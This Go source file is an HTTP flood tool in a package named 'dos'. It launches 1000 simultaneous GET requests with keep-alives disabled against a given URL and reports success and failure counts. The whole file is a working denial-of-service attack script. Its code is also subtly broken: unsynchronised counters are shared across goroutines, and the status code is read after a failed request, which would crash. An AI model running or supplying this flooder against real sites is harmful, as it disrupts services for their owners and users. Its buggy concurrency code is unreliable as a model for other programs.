package dos

import (
	"encoding/json"
	"fmt"
	log "github.com/sirupsen/logrus"
	"net/http"
	"strconv"
	"time"
)

/*
	Sending Continuous Http request
*/
var (
	start = make(chan bool)
)

type Report struct {
	Successful int
	Failed     int
	Total      int
}

var report Report

func HttpFlood(url string) {
	report = Report{Successful: 0, Failed: 0, Total: 0}
	sleepInterval := 2
	totalReqCount := 1000
	const timeLimit = 60
	timeNow := time.Now()
	timeEnd := timeNow.Add(time.Second * timeLimit)
	log.Info("[+] Starting httpFlood at : " + timeNow.String())
	var jsonData []byte

	for i := 0; i < totalReqCount; i++ {
		go sendRequest(url, i)
	}
	close(start)
	for report.Total != totalReqCount {
		time.Sleep(time.Duration(sleepInterval) * time.Second)
		timeNow = time.Now()
		if timeNow.After(timeEnd) {
			report.Failed += (totalReqCount - report.Total)
			report.Total = totalReqCount
		}
		jsonData, _ = json.MarshalIndent(report, "", "    ")
		fmt.Println(string(jsonData))
	}
}

func sendRequest(url string, threadNumber int) {
	<-start
	// log.Info("[+] Worker " + strconv.Itoa(threadNumber) + " starting...")
	client := http.Client{
		Transport: &http.Transport{
			MaxIdleConnsPerHost: -1,
			DisableKeepAlives:   true,
		},
	}
	request, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("error")
		fmt.Println(err)
		return
	}

	response, err := client.Do(request)
	if err != nil {
		log.Error("[-] Error occurred...")
		log.Error(err)
	}
	statusCode := strconv.Itoa(response.StatusCode)
	fmt.Println(statusCode)

	if statusCode == "200" {
		report.Successful += 1
	} else {
		report.Failed += 1
	}
	report.Total += 1
	// log.Info("[+] Worker " + strconv.Itoa(threadNumber) + " stopping...")
}
